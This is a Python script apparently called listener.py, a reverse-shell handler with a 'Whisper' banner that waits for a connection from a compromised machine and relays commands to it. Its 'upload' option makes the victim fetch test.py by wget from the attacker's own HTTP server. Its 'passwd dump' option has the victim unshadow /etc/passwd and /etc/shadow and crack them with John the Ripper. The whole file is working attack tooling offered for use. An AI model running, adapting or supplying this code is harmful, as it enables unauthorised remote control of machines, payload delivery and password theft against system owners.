#!/usr/bin/env python3

import socket
import random
import http.server
import socketserver
import threading
import sys

def simple_server(port):

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    server_thread = threading.Thread(target=httpd.serve_forever,daemon= True)
    server_thread.start()
    return server_thread, httpd


def crack_password(conn):
    command = "/usr/sbin/unshadow /etc/passwd /etc/shadow > crack.txt\n".encode("utf-8")
    conn.sendall(command)
    command = "john crack.txt\n".encode("utf-8")
    conn.sendall(command)
    command = "john -show crack.txt\n".encode("utf-8")
    conn.sendall(command)
    data = conn.recv(16392)
    data_decoded = data.decode("utf-8")    
    print (data_decoded)


def listen(server, port):
    print (r"""
    
 __      __.__    .__                             
/  \    /  \  |__ |__| ____________   ___________ 
\   \/\/   /  |  \|  |/  ___/\____ \_/ __ \_  __ \
 \        /|   Y  \  |\___ \ |  |_> >  ___/|  | \/
  \__/\  / |___|  /__/____  >|   __/ \___  >__|   
       \/       \/        \/ |__|        \/      

""")


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

            sock.bind((server, port))
            sock.listen()
            print('\n--------Listening on port----------', port)
            conn, addr = sock.accept()
            sock.settimeout(0.1)
            conn.settimeout(0.1)
            return conn

def shell(conn):
    with conn:
            print ("Session Started")
            while True:

                conn.sendall("pwd\n".encode("utf-8"))
                data = conn.recv(16392)
                data_decoded = data.decode("utf-8")
                formated = str (data_decoded[0:-1])+ " $"
                print ("\n"+formated , end= "" ) # end = "" we took this out because of error

                try:
                    command = input()+ "\n"

                    if command.startswith("upload"):
                        thread, server = simple_server(8080)
                        host_name = socket.gethostname()
                        host_ip = socket.gethostbyname(host_name)
                        print("IP :", host_ip)
                        url = 'wget %s:8080/test.py' % host_ip
                        conn.sendall((url + '\n').encode('utf-8'))
                        server.shutdown()
                        thread.join()
                        continue

                    elif command.startswith("passwd dump"):
                        crack_password(conn)
                        
                        
                    else:
                        conn.sendall(command.encode("utf-8"))
                    try:
                        data = conn.recv(16392)
                        data_decoded = data.decode("utf-8")
                        print("\n"+data_decoded+"\n", end="")
                        continue

                    except socket.timeout:
                        conn.sendall('pwd\n'.encode('utf-8'))
                        data = conn.recv(16392)
                        data_decoded = data.decode("utf-8")
                    
                        continue

                except KeyboardInterrupt:
                    print ("\n---------Goodbye-----------")
                    # sock.close()
                    conn.close()
                    break 

def main():
    
    if len(sys.argv) != 2 or not sys.argv[1].isdigit(): 
        print ("usage python listener.py <Port>")
        return 1

    server = '0.0.0.0'
    port = int(sys.argv[1])
    
    conn = listen(server,port)
    shell(conn)

if __name__ == '__main__':

    try:
        main()
    except Exception as E : 
        print (E)
        sys.exit()
